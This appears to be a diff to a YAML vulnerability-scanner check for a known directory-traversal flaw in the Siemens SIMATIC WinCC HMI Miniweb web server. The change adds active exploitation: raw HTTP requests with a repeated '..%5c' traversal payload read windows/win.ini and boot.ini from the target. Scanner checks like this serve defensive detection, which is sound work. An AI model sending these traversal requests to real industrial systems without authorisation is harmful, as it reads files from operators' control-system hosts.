@@ -3,31 +3,39 @@
 #
 # The SIMATIC WinCC HMI "Miniweb" web server fails to properly sanitize
 # user-supplied input, exposing HTTP-header-injection, directory-traversal and
-# arbitrary-memory-read issues. The active check fingerprints an exposed,
-# affected Miniweb server by requesting its start page and confirming the
-# characteristic "Miniweb Start Page" marker in the response body.
+# arbitrary-memory-read issues. This active check first fingerprints an exposed
+# Miniweb server by requesting its start page (gate only — a patched server
+# still serves it), then actively exploits the directory-traversal flaw with a
+# backslash-encoded ..%5c payload to read a Windows system file. The finding is
+# raised ONLY when leaked file content comes back, never on the start page alone.
 #
-# Detection: GET /www/start.html over a raw HTTP/1.0 request, confirm the
-# "Miniweb Start Page" marker. QoD 75 (response-content analysis).
+# Detection: GET /www/start.html over a raw HTTP/1.0 request to gate on the
+# "Miniweb Start Page" marker, then GET /..%5c..%5c...%5c<file> and confirm the
+# returned file content (windows/win.ini -> "[fonts]", boot.ini -> "[boot
+# loader]"). QoD 75 (response-content analysis).
 #
 # Ported from OpenVAS/Greenbone NVT 2012/gb_simatic_wincc_hmi_51836.nasl
-# (GPL-2.0-only) — detection kept faithful to the cited plugin (same URL and
-# match pattern); no invented URL/header/pattern.
+# (GPL-2.0-only) — detection kept faithful to the cited plugin (same start-page
+# gate, same ..%5c traversal URL and traversal_files("windows") markers); no
+# invented URL/header/pattern.
 uid: 01af9792-5c2e-4cba-98f6-a308aa7187b7
 name: "Siemens SIMATIC WinCC HMI Web Server Multiple Input Validation Vulnerabilities"
 description: |
   Detects an exposed Siemens SIMATIC WinCC HMI "Miniweb" web server affected by
   multiple input-validation flaws (HTTP header injection, directory traversal,
-  arbitrary memory read). Confirms by requesting /www/start.html and matching the
-  "Miniweb Start Page" marker in the response.
+  arbitrary memory read). Gates on the "Miniweb Start Page" marker at
+  /www/start.html, then actively confirms the directory-traversal flaw by
+  reading a Windows system file via a ..%5c backslash-traversal URL and matching
+  its content. A patched Miniweb still serves the start page but no longer leaks
+  the file, so the finding fires only on confirmed traversal.
 cves: [CVE-2011-4512, CVE-2011-4878, CVE-2011-4879]
 cvss: 8.5
 severity: high
 confidence_base: 0.30
-tags: [siemens, simatic, wincc, hmi, scada, ics, miniweb, input-validation]
+tags: [siemens, simatic, wincc, hmi, scada, ics, miniweb, input-validation, directory-traversal]
 services: [http, https]
 author: noctis
-version: "1.0.0"
+version: "1.1.0"
 references:
   - "https://nvd.nist.gov/vuln/detail/CVE-2011-4512"
   - "https://nvd.nist.gov/vuln/detail/CVE-2011-4878"
@@ -38,23 +46,76 @@ references:
 
 
 steps:
-  # ── Fingerprint the Miniweb start page ───────────────────────────────────
+  # ── Gate variable — must be initialised before use in a condition ─────────
+  - id: init-gate
+    action: set_var
+    var_name: miniweb_found
+    var_value: false
+
+  # ── Fingerprint the Miniweb start page (GATE ONLY, no finding) ────────────
   # Raw HTTP/1.0 request (verbatim), matched on resp.banner — mirrors the NASL
-  # http_vuln_check(url:"/www/start.html", pattern:"Miniweb Start Page").
+  # http_vuln_check(url:"/www/start.html", pattern:"Miniweb Start Page") used
+  # as the plugin's precondition. A patched server also serves this page, so it
+  # only opens the gate; it never raises a finding on its own.
   - id: start-page
     action: tcp_connect
     port: "{{port}}"
     send: "GET /www/start.html HTTP/1.0\r\nHost: {{target_host}}\r\n\r\n"
     timeout_secs: 10
-    store_as: resp
+    store_as: fp_resp
 
   - id: start-page-match
     action: match
-    source: resp.banner
+    source: fp_resp.banner
     pattern: "Miniweb Start Page"
+    on_match:
+      set_vars:
+        miniweb_found: true
+
+  # ── Active traversal #1 — windows/win.ini -> "[fonts]" ────────────────────
+  # NASL: url = "/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c" + file,
+  # with traversal_files("windows"). tcp_connect is mandatory: reqwest would
+  # normalise the backslash-encoded payload away. Only runs once the gate is
+  # open; raises the finding ONLY when the leaked file content is returned.
+  - id: traversal-winini
+    action: tcp_connect
+    port: "{{port}}"
+    send: "GET /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini HTTP/1.0\r\nHost: {{target_host}}\r\n\r\n"
+    timeout_secs: 10
+    store_as: winini_resp
+    condition: "miniweb_found == true"
+
+  - id: traversal-winini-match
+    action: match
+    source: winini_resp.banner
+    pattern: "\\[fonts\\]"
+    case_insensitive: true
+    condition: "miniweb_found == true"
     on_match:
       finding:
         confidence_delta: 0.55
         qod: 75
-        evidence: "SIMATIC WinCC Miniweb start page exposed at /www/start.html: {{resp.banner}}"
+        evidence: "SIMATIC WinCC Miniweb directory traversal confirmed — windows/win.ini read via /..%5c..%5c...%5cwindows/win.ini: {{winini_resp.banner}}"
+      stop: true
+
+  # ── Active traversal #2 (fallback) — boot.ini -> "[boot loader]" ──────────
+  - id: traversal-bootini
+    action: tcp_connect
+    port: "{{port}}"
+    send: "GET /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cboot.ini HTTP/1.0\r\nHost: {{target_host}}\r\n\r\n"
+    timeout_secs: 10
+    store_as: bootini_resp
+    condition: "miniweb_found == true"
+
+  - id: traversal-bootini-match
+    action: match
+    source: bootini_resp.banner
+    pattern: "\\[boot loader\\]"
+    case_insensitive: true
+    condition: "miniweb_found == true"
+    on_match:
+      finding:
+        confidence_delta: 0.55
+        qod: 75
+        evidence: "SIMATIC WinCC Miniweb directory traversal confirmed — boot.ini read via /..%5c..%5c...%5cboot.ini: {{bootini_resp.banner}}"
       stop: true
